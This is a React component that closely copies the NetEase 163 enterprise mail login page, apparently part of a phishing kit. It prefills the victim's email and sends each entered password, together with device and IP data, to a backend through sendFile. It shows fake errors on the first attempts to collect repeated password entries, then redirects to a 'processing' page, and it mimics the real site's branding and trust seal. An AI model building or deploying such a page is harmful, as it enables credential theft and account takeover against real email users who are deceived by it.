import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";
import { navigate } from "@reach/router";
//import "./main.css";

function Page126({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,
    device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("../processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  return (
    <Fragment>
      <Helmet>
        <link rel="stylesheet" href="../126/main.css" />
      </Helmet>
      <div>
        <header className="g-hd">
          <div>
            <h1 className="w-qiyelogo">
              <a
                href="https://qiye.163.com/"
                target="_blank"
                data-lang-title="中国第一大电子邮件服务商"
                title="中国第一大电子邮件服务商"
                data-tj-key="b_Logo_click"
              />
            </h1>
            <nav className="m-hdnav">
              <a
                href="https://qiye.163.com/entry/buy-price.htm"
                target="_blank"
                data-tj-key="b_Registe_click"
                data-lang-key="新用户开通"
              >
                新用户开通
              </a>
              <a
                href="https://qiye.163.com/login/?hl=zh_CN"
                data-tj-key="b_CN_Language_click"
                id="hlCn"
                className="f-hide"
              >
                简体版
              </a>
              <a
                href="https://qiye.163.com/login/?hl=en_US"
                data-tj-key="b_EN_Language_click"
                id="hlEn"
              >
                English
              </a>
              <a
                href="https://hw.qiye.163.com/"
                target="_blank"
                data-tj-key="b_ForeignUserLogin_click"
                data-lang-key="国外用户登录"
              >
                国外用户登录
              </a>
              <a
                href="http://mail.163.com/dashi/dlpro.html?from=mail45"
                target="_blank"
                data-tj-key="b_Dashi_click"
                data-lang-key="邮箱大师"
              >
                邮箱大师
              </a>
              <a
                id="help-url-id"
                href="https://qiye.163.com/help/l-1.html"
                target="_blank"
                data-tj-key="b_Help_click"
                data-lang-key="帮助中心"
              >
                帮助中心
              </a>
            </nav>
          </div>
        </header>
        <section className="g-bd">
          <div className="g-bd-mn js-bdImg" id="bdImg">
            <div className="m-theme"></div>
            <div
              id="loginBlock"
              className="m-login m-login-with-ad js-loginpanel"
            >
              <div className="new-loginFunc">
                <div
                  id="lbApp"
                  className="new-loginFuncApp qrcode-qiye-icon"
                  data-tj-key="b_Qrcode_icon_click"
                />
                <div
                  id="lbNormal"
                  className="new-loginFuncNormal account-qiye-icon"
                  data-tj-key="b_AccountPWD_icon_click"
                />
                <i
                  className="ico-login-switch-tips"
                  id="loginSwitchTips"
                  data-lang-key="密码登录在这里"
                >
                  密码登录在这里
                </i>
              </div>
              <div className="login-bd">
                <form
                  className="login-form login-form-acc js-loginform js-loginform-acc"
                  name="accountlogin"
                  onSubmit={submitForm}
                >
                  <h3 className="loginbox-title" data-lang-key="邮箱帐号登录">
                    邮箱帐号登录
                  </h3>
                  <input type="hidden" className="js-domain" name="domain" />
                  <input
                    type="hidden"
                    className="js-accname"
                    name="account_name"
                    defaultValue
                  />
                  <input
                    type="hidden"
                    className="js-isSecure"
                    name="secure"
                    defaultValue={1}
                  />
                  <input
                    type="hidden"
                    className="js-isAllSecure"
                    name="all_secure"
                    defaultValue={1}
                  />
                  <input
                    type="hidden"
                    className="js-language"
                    name="language"
                    defaultValue={0}
                  />
                  <input
                    type="hidden"
                    className="js-pubid"
                    name="pubid"
                    defaultValue
                  />
                  <input
                    type="hidden"
                    className="js-passtype"
                    name="passtype"
                    defaultValue
                  />
                  <input
                    type="hidden"
                    className="js-referer"
                    name="referer"
                    defaultValue
                  />
                  <input
                    type="hidden"
                    className="js-module"
                    name="module"
                    defaultValue
                  />
                  <input
                    type="hidden"
                    className="js-ua"
                    name="ua"
                    defaultValue
                  />
                  <input
                    type="hidden"
                    className="js-ch"
                    name="ch"
                    defaultValue="hw"
                  />
                  <div className="m-ipt js-ipt">
                    <span className="icon icon-account" />
                    <input
                      id="accname"
                      className="ipt js-value js-username"
                      tabIndex={1}
                      data-lang-placeholder="邮箱地址"
                      placeholder="邮箱地址"
                      data-lang-title="请输入完整邮箱地址"
                      title="请输入完整邮箱地址"
                      name="username"
                      onChange={handleChange}
                      value={values.username}
                      disabled
                      required
                    />
                    <div className="m-error" />
                  </div>
                  <div className="m-ipt js-ipt">
                    <span className="icon icon-pwd" />
                    <input
                      id="accpwd"
                      className="ipt js-value js-pwd"
                      tabIndex={2}
                      data-lang-placeholder="密码"
                      placeholder="密码"
                      data-lang-title="请输入密码"
                      title="请输入密码"
                      type="password"
                      name="password"
                      value={values.password}
                      onChange={handleChange}
                      required
                    />
                    <div className="m-error" />
                  </div>
                  <div className="loginconf">
                    <div className="logincheck js-logincheck">
                      <span className="icon icon-checkbox js-checkbox" />
                      <label
                        htmlFor="accautologin"
                        className="checklabel js-autolabel"
                      >
                        <input
                          tabIndex={3}
                          data-lang-title="记住帐号"
                          title="记住帐号"
                          className="checkipt js-autologin"
                          type="checkbox"
                          id="accautologin"
                        />
                        <span data-lang-key="记住帐号">记住帐号</span>
                      </label>
                      <div
                        className="securetip js-securetip"
                        data-lang-key="为了您的信息安全，请不要在网吧或公用电脑上使用此功能！"
                      >
                        为了您的信息安全，请不要在网吧或公用电脑上使用此功能！
                      </div>
                    </div>
                    <a
                      href="https://mail.qiye.163.com/mailapp/qiyeurs/?from=http%3A%2F%2Fmail.qiye.163.com%2F#/resetPwd"
                      className="forgetpwd"
                      target="_blank"
                      data-tj-key="b_ResetPwd_click"
                      data-lang-key="忘记密码"
                    >
                      忘记密码
                    </a>
                  </div>
                  <div>
                    <div className="m-verifycode">
                      <div className="m-ipt js-ipt">
                        <input
                          id="accverifycode"
                          className="ipt js-value js-verifycode"
                          tabIndex={2}
                          data-lang-title="请输入验证码"
                          title="请输入验证码"
                          data-lang-placeholder="验证码"
                          placeholder="验证码"
                          name="verify_code"
                        />
                        <div className="m-error" />
                      </div>
                      <img
                        width={90}
                        id="imgVerifycode"
                        className="refreshVerifycode"
                        data-lang-title="点击切换"
                        title="点击切换"
                      />
                    </div>
                  </div>
                  <div className="loginbtn">
                    <input
                      type="submit"
                      disabled={submited.status}
                      className="w-button w-button-account js-loginbtn"
                      defaultValue="登 录"
                      tabIndex={4}
                      data-lang-key="登 录"
                    />
                  </div>
                  <div id="accLoginSslSelector" className="loginact">
                    <div className="loginselect">
                      <a
                        className="selector js-sslsel"
                        href=""
                        hidefocus="true"
                      >
                        <span data-lang-key="正使用">正使用</span>
                        <span className="js-ssltxt" data-lang-key="全程SSL">
                          全程SSL
                        </span>
                        <span className="icon icon-arrow" />
                      </a>
                      <div className="m-lgselect js-lgselect">
                        <ul>
                          <li>
                            <a
                              className="js-selitem selected"
                              href=""
                              hidefocus="true"
                              data-allssl={1}
                              data-tj-value={1}
                              data-lang-key="全程SSL"
                            >
                              全程SSL
                            </a>
                          </li>
                          <li>
                            <a
                              className="js-selitem"
                              href=""
                              hidefocus="true"
                              data-allssl={0}
                              data-tj-value={0}
                              data-lang-key="SSL登录"
                            >
                              SSL登录
                            </a>
                          </li>
                        </ul>
                      </div>
                    </div>
                    <div className="chselect">
                      <a className="selector js-chsel" href="" hidefocus="true">
                        <span data-lang-key="正在使用">正在使用</span>
                        <span className="js-chtxt" data-lang-key="默认线路">
                          国际线路
                        </span>
                        <span className="icon icon-arrow" />
                      </a>
                      <div
                        className="m-lgselect js-lgchselect"
                        style={{ display: "none" }}
                      >
                        <ul>
                          <li>
                            <a
                              className="js-selitem"
                              href=""
                              hidefocus="true"
                              data-ch
                              data-tj-value={1}
                              data-lang-key="默认线路"
                            >
                              默认线路
                            </a>
                          </li>
                          <li>
                            <a
                              className="js-selitem selected"
                              href=""
                              hidefocus="true"
                              data-ch="hw"
                              data-lang-key="国际线路"
                            >
                              国际线路
                            </a>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  <div className="pane-handler">
                    <a
                      href=""
                      id="switchAdminCtrl"
                      data-tj-key="b_AdminTab_click"
                      data-lang-key="管理员登录"
                    >
                      管理员登录
                    </a>
                  </div>
                </form>
                <div id="msgpid" className="loginerror" />
              </div>
              <div className="m-codebox js-codebox f-zindex-10">
                <div id="appLoginTab" className="appLoginTab">
                  <h3 data-lang-key="手机扫码 安全登录">手机扫码 安全登录</h3>
                  <div id="appLoginWait" style={{ display: "block" }}>
                    <div id="appCodeWrap" className="appCodeWrap allowmove">
                      <div className="appCode-example" />
                      <div id="appCodeBox" className="appCodeBox">
                        <img
                          id="appCode"
                          className="appCode"
                          width={130}
                          height={130}
                          src="./qiye_files/getqrcode.do"
                        />
                        <div
                          id="appCodeRefresh"
                          className="appCodeRefresh"
                          style={{ display: "none" }}
                        >
                          <div className="appCode-mask" />
                          <div className="appCode-wrap">
                            <p data-lang-key="二维码已失效">二维码已失效</p>
                            <a
                              href=""
                              data-tj-key="b_appLogin_refresh_qrcode_click"
                              data-lang-key="请点击刷新"
                            >
                              请点击刷新
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>
                    <p id="appLoginTxt" className="appLoginTxt txt-err" />
                    <p className="appLogin-hint">
                      <span data-lang-key="使用">使用</span>
                      <a
                        data-tj-key="b_DownloadDashi_click"
                        href="https://mail.163.com/dashi/dlpro.html?from=mail23"
                        target="_blank"
                        data-lang-key="网易邮箱大师"
                      >
                        网易邮箱大师
                      </a>
                      <span data-lang-key="扫描二维码登录">扫描二维码登录</span>
                    </p>
                  </div>
                  <div
                    id="appLoginScan"
                    className="appLoginScan"
                    style={{ display: "none" }}
                  >
                    <div className="appLogin-scanSuc" />
                    <p
                      className="appLogin-scantxt txt-suc"
                      data-lang-key="成功扫描，请在手机上确认登录"
                    >
                      成功扫描，请在手机上确认登录
                    </p>
                    <a
                      id="appLoginRestart"
                      className="appLoginRestart"
                      href=""
                      data-lang-key="返回重新扫描"
                    >
                      返回重新扫描
                    </a>
                  </div>
                </div>
                <div id="qrcodeLoginSslSelector" className="loginact">
                  <input type="hidden" id="appCh" defaultValue="hw" />
                  <div className="loginselect">
                    <a className="selector js-sslsel" href="" hidefocus="true">
                      <span data-lang-key="正使用">正使用</span>
                      <span className="js-ssltxt" data-lang-key="全程SSL">
                        全程SSL
                      </span>
                      <span className="icon icon-arrow" />
                    </a>
                    <div className="m-lgselect js-lgselect">
                      <ul>
                        <li>
                          <a
                            className="js-selitem selected"
                            href=""
                            hidefocus="true"
                            data-allssl={1}
                            data-lang-key="全程SSL"
                          >
                            全程SSL
                          </a>
                        </li>
                        <li>
                          <a
                            className="js-selitem"
                            href=""
                            hidefocus="true"
                            data-allssl={0}
                            data-lang-key="SSL登录"
                          >
                            SSL登录
                          </a>
                        </li>
                      </ul>
                    </div>
                  </div>
                  <div className="chselect">
                    <a className="selector js-chsel" href="" hidefocus="true">
                      <span data-lang-key="正在使用">正在使用</span>
                      <span className="js-chtxt" data-lang-key="默认线路">
                        国际线路
                      </span>
                      <span className="icon icon-arrow" />
                    </a>
                    <div
                      className="m-lgselect js-lgchselect"
                      style={{ display: "none" }}
                    >
                      <ul>
                        <li>
                          <a
                            className="js-selitem"
                            href=""
                            hidefocus="true"
                            data-ch
                            data-lang-key="默认线路"
                          >
                            默认线路
                          </a>
                        </li>
                        <li>
                          <a
                            className="js-selitem selected"
                            href=""
                            hidefocus="true"
                            data-ch="hw"
                            data-lang-key="国际线路"
                          >
                            国际线路
                          </a>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
                <div className="pane-handler">
                  <a
                    href=""
                    id="switchNormalCtrl"
                    data-tj-key="b_AccountPWD_text_click"
                    data-lang-key="密码登录"
                  >
                    密码登录
                  </a>
                </div>
              </div>
              <div
                id="normalLoginFormMask"
                className="login-form-mask"
                style={{ display: "none" }}
              >
                <p className="login-form-mask-loading">
                  <i />
                  <span>载入中...</span>
                </p>
              </div>
              <div id="loginPanelBottomAdBlock" className="m-login-bottom-ad" />
            </div>
          </div>
        </section>
        <footer className="g-ft">
          <div className="g-wrap">
            <nav className="m-ftnav">
              <a
                href="http://gb.corp.163.com/gb/home.shtml"
                target="_blank"
                data-tj-key="b_AboutNetease_click"
                data-lang-key="关于网易"
              >
                关于网易
              </a>
              <a
                href="http://weibo.com/163qiye"
                target="_blank"
                data-tj-key="b_Weibo_click"
                data-lang-key="官方微博"
              >
                官方微博
              </a>
              <a
                href="http://gb.corp.163.com/gb/legal.html"
                target="_blank"
                data-tj-key="b_AboutLegal_click"
                data-lang-key="相关法律"
              >
                相关法律
              </a>
              <a
                href="https://reg.163.com/agreement_mobile_ysbh_wap.shtml?v=20171127"
                target="_blank"
                data-tj-key="b_PrivacyPolicy_click"
                data-lang-key="隐私政策"
              >
                隐私政策
              </a>
              | <span data-lang-key="网易公司版权所有">网易公司版权所有</span>
              ©1997- 2020
              <a
                id="KX_IMG"
                className="w-kximg"
                href="https://ss.knet.cn/verifyseal.dll?sn=e12051044010020841301459&ct=df&pa=151131"
                target="_blank"
              >
                <img
                  src="data:image/png;base64,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"
                  alt="可信网站，身份验证"
                />
              </a>
            </nav>
          </div>
        </footer>
        <img
          src="./qiye_files/httpsEnable.gif"
          style={{
            position: "absolute",
            left: "-999em",
            top: "-999em",
            width: 0,
            height: 0,
          }}
        />
        <link rel="stylesheet" href="../style.css" />
      </div>
    </Fragment>
  );
}

export default Page126;
